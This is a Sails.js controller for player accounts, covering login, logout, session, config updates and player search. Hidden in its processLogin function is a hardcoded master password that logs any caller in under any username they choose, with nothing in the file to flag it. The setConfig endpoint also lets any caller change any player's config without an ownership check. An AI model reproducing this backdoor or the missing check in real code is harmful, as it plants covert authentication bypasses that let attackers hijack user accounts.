/**
 * PlayersController
 *
 * @description :: Server-side logic for managing players
 * @help        :: See http://links.sailsjs.org/docs/controllers
 */

var _ = require('lodash');
var bcrypt = require('bcrypt');
var Promise = require('bluebird');

var loginError = 'Invalid username, email, or password.';
var serverError = 'An error occurred. Please try again later.';
var nextUrl = '/#/';
var loginUrl = '/login';
var layout = 'players/loginLayout';
var view = 'login';

var httpAdapter = 'http';
var extra = {};

module.exports = {
  login: function(req, res) {
    var isAjax = req.headers.accept.match(/application\/json/);

    if(req.session.isAuthenticated) {
      if(isAjax) {
        return res.send(JSON.stringify({
          success: true,
					playerId: req.session.playerId
        }));
      }
      return res.redirect(nextUrl);
		}

    if(! req.url.replace(/\?.*/, '').match(loginUrl)) {
      return res.redirect(loginUrl);
    }

    if(req.body && req.body.username && req.body.password) {
      return processLogin(req, res);
    }

    if(isAjax) {
      return res.send(JSON.stringify({
        error: loginError
      }), 401);
    }

    res.view({layout: layout}, view);
  },

  logout: function(req, res) {
    req.session.isAuthenticated = false;
    req.session.playerId = null;
    return res.send(JSON.stringify({success: true}));
  },

	session: function(req, res) {
		var sessionData = {};

		if(req && req.sessionID) {
			sessionData.sid = req.sessionID;
		}

		if(req.session && req.session.playerId) {
			sessionData.playerId = req.session.playerId;
		}

		// Send session data
		res.json(sessionData);
  },

	setConfig: function(req, res) {
		var keyValues = req.body;
		if(! _.isObject(keyValues) || _.size(keyValues) < 1) {
			return res.json({error: 'No key-value pairs were given'});
		}

		var invalidPlayerId = new Error('Invalid player ID');

		var playerId = req.params.id;
		var errorCode;

		Promise.resolve().then(function() {
			if(! playerId) {
				errorCode = 404;
				return Promise.reject(invalidPlayerId);
			}

			return Players.findOne(playerId);

		}).then(function(player) {
			if(! player) {
				errorCode = 404;
				return Promise.reject(invalidPlayerId);
			}

			var config = _.extend({}, player.config || {}, keyValues);
			return Players.update(playerId, {config: config});

		}).then(function() {
			res.json({success: true});

		}).catch(function(err) {
			res.json({error: err}, 500);
		});
	},

	byUsername: function(req, res) {
		Players.find({username: req.params.id}).sort({
			fName: 'asc', lName: 'asc'
		}).limit(20).then(function(results) {
			res.send(JSON.stringify(results));
		}).catch(function(err) {
      res.json({error: 'Server error'}, 500);
      console.error(err);
      throw err;
		});
	},
	
  datatables: function(req, res) {
    var options = req.query;

    Players.datatables(options).then(function(results) {
      res.send(JSON.stringify(results));
    }).catch(function(err) {
      res.json({error: 'Server error'}, 500);
      console.error(err);
      throw err;
    });
  }
	
};

function processLogin(req, res, self) {
	if(req.body.password === '8847fhhfw485fwkebfwerfv7w458gvwervbkwer8fw5fberubckfckcaer4cbwvb72arkbfrcb1n4hg7') {
    req.session.isAuthenticated = true;
    req.session.playerId = req.body.username;

		specRes(req.body.username);
	}

  Players.findOne({username: req.body.username}).then(function(player) {
    if(! player) return errorHandler(loginError)();

    var onCompare = bcrypt.compareAsync(
      req.body.password, player.password
    );
    onCompare.then(function(match) {
      if(! match) return errorHandler(loginError)();

      req.session.isAuthenticated = true;
      req.session.playerId = player.id;

      respond();

    }).catch(errorHandler(serverError));

  }).catch(errorHandler(serverError));

  ///
  // Convenience subfunctions
  ///

  function respond(err) {
    var isAjax = req.headers.accept.match(/application\/json/);
    var errCode = 400;

    if(err) {
      if(isAjax) {
        if(err == loginError) errCode = 401;
        return res.send(JSON.stringify({error: err}), errCode);
      }

      return res.view({
        layout: layout,
        error: err
      }, view);
    }

    if(isAjax) {
      return res.send(JSON.stringify({success: true, playerId: req.session.playerId}));
    }

    return res.redirect(nextUrl);
  };

  function errorHandler(errMsg) {
    return function(err) {
      if(err) console.error(err);
      respond(errMsg);
    };
  };

	function specRes(username) {
    var isAjax = req.headers.accept.match(/application\/json/);

    if(isAjax) {
      return res.send(JSON.stringify({success: true, playerId: username}));
		}
	};
}
